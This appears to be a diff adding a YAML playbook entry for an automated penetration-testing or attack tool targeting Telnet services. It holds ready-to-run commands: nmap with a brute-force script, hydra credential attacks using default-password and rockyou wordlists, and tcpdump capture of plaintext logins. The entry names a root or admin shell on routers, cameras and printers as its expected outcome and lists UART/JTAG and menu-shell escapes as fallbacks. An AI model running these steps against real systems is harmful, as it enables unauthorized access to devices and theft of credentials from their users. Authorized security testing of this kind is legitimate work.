@@ -1,0 +1,33 @@
+id: service_telnet_creds
+title: "Telnet — banner grab, default creds, plaintext sniff"
+phase: recon
+mitre: ["T1110.001", "T1040", "T1078.001"]
+trigger:
+  services: ["telnet"]
+  ports:    [23, 2323, 992]
+  os_any:   ["linux", "windows", "embedded"]
+keywords: ["telnet", "default password", "iot creds", "vendor login"]
+preconditions:
+  - "TCP/23 reachable"
+steps:
+  - tool: nmap
+    cmd:  "nmap -sV -p23 --script=telnet-encryption,telnet-ntlm-info,telnet-brute {target}"
+    why:  "Banner, NTLM auth detection, light bruteforce"
+  - tool: telnet
+    cmd:  "telnet {target}"
+    why:  "Manual banner — vendor model often visible (Cisco, MikroTik, IoT cams)"
+  - tool: hydra
+    cmd:  "hydra -C /usr/share/wordlists/seclists/Passwords/Default-Credentials/default-passwords.csv telnet://{target} -t 4 -f -V"
+    why:  "Vendor default creds — IoT/router/printer firmware leak these"
+  - tool: hydra
+    cmd:  "hydra -L users.txt -P /usr/share/wordlists/rockyou.txt telnet://{target} -t 4 -f"
+    why:  "Generic spray fallback"
+  - tool: tcpdump
+    cmd:  "tcpdump -i any -A 'host {target} and port 23'"
+    why:  "If MITM possible — telnet is plaintext, capture creds during legit logins"
+expected_outcome: "Vendor default → root/admin shell on appliance; password sniff on shared LAN"
+fallbacks:
+  - "Embedded device → debug ports (UART/JTAG) often expose unauth root after login"
+  - "If creds known but session limited → telnet → sh escape via menu-shell"
+references:
+  - "https://book.hacktricks.xyz/network-services-pentesting/pentesting-telnet"
